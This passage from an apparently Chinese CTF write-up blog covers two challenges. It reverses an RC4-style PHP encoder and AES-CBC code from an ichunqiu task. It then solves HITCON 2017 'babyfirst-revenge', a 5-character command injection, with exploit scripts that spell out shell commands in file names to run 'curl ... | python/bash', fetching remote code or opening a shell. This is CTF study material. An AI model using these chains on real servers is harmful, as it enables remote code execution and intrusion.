class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$u</span> = <span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="variable">$n</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$u</span> = (<span class="variable">$u</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$u</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$u</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$u</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable">$o</span>.= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$b</span>[<span class="variable">$r</span>]) ^ (<span class="variable">$p</span>[(<span class="variable">$p</span>[<span class="variable">$u</span>] + <span class="variable">$p</span>[<span class="variable">$s</span>]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$h</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$o</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;flag_1s_n0t_h3re&quot;</span>;</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&quot;3133g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读完发现是个rc4的加密 简要分析一下,代码将原来的内容进行了处理得到的部分进行rc4加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p>而最后得出的结果是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable">$h</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$o</span>));</span><br></pre></td></tr></table></figure><p>那么去掉<code>$h</code>的部分,然后加上padding再decode一下得到原来的内容,然后再加密一次即可. 我这里简单粗暴,直接把内容放在加密部分前面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$d</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;flag_1s_n0t_h3re&quot;</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$g</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$h</span> = <span class="string">&quot;3133&quot;</span>;</span><br><span class="line">    <span class="variable">$l</span> = <span class="variable">$f</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$f</span> . <span class="variable">$h</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$l</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="variable">$q</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt;= <span class="number">255</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$q</span>[<span class="variable">$r</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$l</span>[<span class="variable">$r</span> % <span class="variable">$m</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="number">256</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$r</span>] + <span class="variable">$q</span>[<span class="variable">$r</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$r</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$r</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg==&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$u</span> = <span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="variable">$n</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$u</span> = (<span class="variable">$u</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$u</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$u</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$u</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable">$o</span>.= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$b</span>[<span class="variable">$r</span>]) ^ (<span class="variable">$p</span>[(<span class="variable">$p</span>[<span class="variable">$u</span>] + <span class="variable">$p</span>[<span class="variable">$s</span>]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return $h . str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($o));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&quot;3133g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg==&quot;</span>),<span class="string">&quot;flag_1s_n0t_h3re&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后拿到结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000ff37e751ba467c59flag is in flag.jsqö=ÈÔp–³¬–&gt;O�ê:Üï(]¥ž</span><br></pre></td></tr></table></figure><p>发现内容<code>flag is in flag.js</code> 那么继续分析flag.js 格式依旧很烂,美化一下,然后发现最后有一段混淆,解一下,得到结果 重点关注解混淆的地方</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Key</span> = <span class="string">&quot;7a57a5a743894a0e&quot;</span>;</span><br><span class="line"><span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span> = &#123;</span><br><span class="line">    <span class="attr">pad</span>: <span class="keyword">function</span>(<span class="params">data, blockSize</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> blockSizeBytes = blockSize * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = blockSizeBytes - data.<span class="property">sigBytes</span> % blockSizeBytes;</span><br><span class="line">        data.<span class="title function_">concat</span>(<span class="title class_">CryptoJS</span>.<span class="property">lib</span>.<span class="property">WordArray</span>.<span class="title function_">random</span>(nPaddingBytes - <span class="number">1</span>)).<span class="title function_">concat</span>(<span class="title class_">CryptoJS</span>.<span class="property">lib</span>.<span class="property">WordArray</span>.<span class="title function_">create</span>([nPaddingBytes &lt;&lt; <span class="number">24</span>], <span class="number">1</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">unpad</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = data.<span class="property">words</span>[(data.<span class="property">sigBytes</span> - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">2</span>] &amp; <span class="number">0xff</span>;</span><br><span class="line">        data.<span class="property">sigBytes</span> -= nPaddingBytes</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesEncrypt = <span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sendData = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(ivStr);</span><br><span class="line">    <span class="keyword">var</span> encrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(sendData, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(encrypted.<span class="property">ciphertext</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesDecrypt = <span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(ivStr);</span><br><span class="line">    <span class="keyword">var</span> decrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(data, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">        <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Iso10126</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> decrypted.<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> hint = <span class="string">&quot;SSNRTPIuHLUxqtJmq8mDDPtexRU7RTjNO34tLqz+Tpw=&quot;</span>;</span><br></pre></td></tr></table></figure><p>发现是个aes-cbc,然后解密一下,但是发现iv未知,于是使用key作为iv 然后得到结果 <img src="/images/2018/08/ichunqiu-1.jpg" alt="blacsheep" /> 然后并不知道要怎么处理了,不是很懂出题人.</p><h4 id="看了别人的解法">看了别人的解法</h4><p>https://xhyeax.github.io/2019/01/26/icq-2nd-happy-rec/ 别人用的git_extractor 然后diff拿flag,diff一下发现并不知道那个js的文件是真的flag,感觉出题人真的睿智...我是懒得去猜flag了...</p><h2 id="hitcon2017">HITCON2017</h2><h3 id="babyfirst-revenge">babyfirst-revenge</h3><p>5字符命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>本来想法是通过<code>\</code>来多次执行,不过似乎并不可以,<code>exec()</code>每次必定是执行一条完整的命令而不可以分割,所以只能找其他的方法 想了很久并没有想出来,去看了别人的wp,看到的思路大概就是通过重定向写文件,通过构造文件名来执行命令,知道大概的思路之后我就又开始踩坑了. 自己构造构造了很久都是失败,要么需要6个字符,要么少了空格,并没有办法,然后看了别人的wp,复现的时候发现居然还是失败,最无语的是,使用orange的官方wp中的payload居然也没能写出<code>ls -t&gt;g</code>的命令... 不过其实这里是踩坑了,<code>exec</code>的执行和shell的执行似乎是不同的,我也不太理解为什么 先给出官方wp的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.twpython`</span></span><br><span class="line">    <span class="string">&#x27;&gt;on&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;th\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;py\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\\\&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;tw\\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;e.\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;ng\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;ra\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;o\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;\ \\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\\<span class="string">&#x27;, </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # exec</span></span><br><span class="line"><span class="string">    &#x27;</span>sh _<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;</span>sh g<span class="string">&#x27;, </span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r = requests.get(&#x27;</span>http://<span class="number">52.199</span><span class="number">.204</span><span class="number">.34</span>/?reset=<span class="number">1</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 5 </span></span><br><span class="line"><span class="string">    r = requests.get(&#x27;</span>http://<span class="number">52.199</span><span class="number">.204</span><span class="number">.34</span>/?cmd=<span class="string">&#x27; + quote(i) )</span></span><br><span class="line"><span class="string">    print i</span></span><br><span class="line"><span class="string">    sleep(0.2)</span></span><br></pre></td></tr></table></figure><p>看到这里的前面部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># generate `ls -t&gt;g` file</span><br><span class="line">&#x27;&gt;ls\\&#x27;, </span><br><span class="line">&#x27;ls&gt;_&#x27;, </span><br><span class="line">&#x27;&gt;\ \\&#x27;, </span><br><span class="line">&#x27;&gt;-t\\&#x27;, </span><br><span class="line">&#x27;&gt;\&gt;g&#x27;, </span><br><span class="line">&#x27;ls&gt;&gt;_&#x27;, </span><br></pre></td></tr></table></figure><p>在shell中直接执行结果是这样的 <img src="/images/2018/08/ichunqiu-2.jpg" alt="blacsheep" /> 不过当我们直接curl或者网页访问之后结果又不一样 <img src="/images/2018/08/ichunqiu-3.jpg" alt="blacsheep" /> 玄学原因,如果有知道原理的可以发邮件给我,或者加我qq或者留言都行,非常感谢 然后踩的第二个坑是shell中创建<code>s \</code>的文件和curl创建也是不一样的 这个本来有个payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">-t\</span></span><br><span class="line"><span class="language-bash">&gt;\&gt;q</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">l\</span></span><br><span class="line"><span class="language-bash">&gt;s\ \</span></span><br><span class="line"><span class="language-bash"><span class="built_in">ls</span>&gt;a</span></span><br><span class="line"><span class="meta prompt_">ls&gt;</span><span class="language-bash">&gt;a</span></span><br></pre></td></tr></table></figure><p>不过也是这里踩坑了失败了,本来以为要六个字符,其实5个就可以了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ curl &#x27;http://127.0.0.1?cmd=&gt;s\%20\&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回网页</span></span><br><span class="line"></span><br><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ ls</span><br><span class="line">&#x27;s \&#x27;</span><br><span class="line">blacsheep@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7$ sudo su</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# &gt;s\ \</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7<span class="comment"># ls</span></span></span><br><span class="line">&#x27;s &#x27;  &#x27;s \&#x27;</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# rm ./*</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# ls</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# &gt;s\ \\</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7# ls</span><br><span class="line">&#x27;s \&#x27;</span><br><span class="line">root@kali:/var/www/html/sandbox/cfbb870b58817bf7705c0bd826e8dba7#</span><br></pre></td></tr></table></figure><p>curl用到的payload进行<code>urldecode</code>后有5个字符 即<code>?cmd=&gt;s\ \</code>即可创建出<code>s(空格)</code>文件 但是shell执行需要6个字符 即<code>&gt;s\ \\</code>才能创建出<code>s(空格)</code>文件 注意到这些就可以很容易的写出<code>ls -t&gt;g</code>这种类似的命令 能够创建这个命令的话,后续只用反过来把反弹shell的命令写入即可拿到shell 不过弹shell的时候又碰到问题,执行的命令里面不可包含<code>/</code>字符,所以我们不能用传统的反弹shell,而且curl的话不可以包含路径,所以这里我搭了一个docker,然后再去访问拿到shell,这里还要注意创建的文件的名称不可以重复,否则只会创建一次,就会导致命令执行失败 给个简易exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;-t\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\&gt;g&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;&gt;_&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&gt;bash&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;curl your_ip:your_port&#x27;</span></span><br><span class="line">target=<span class="string">&#x27;117.50.3.97:8001&#x27;</span></span><br><span class="line">cmd=<span class="built_in">list</span>(cmd)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(cmd)!=<span class="number">0</span>:</span><br><span class="line">    first=cmd.pop()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cmd)!=<span class="number">0</span>:</span><br><span class="line">        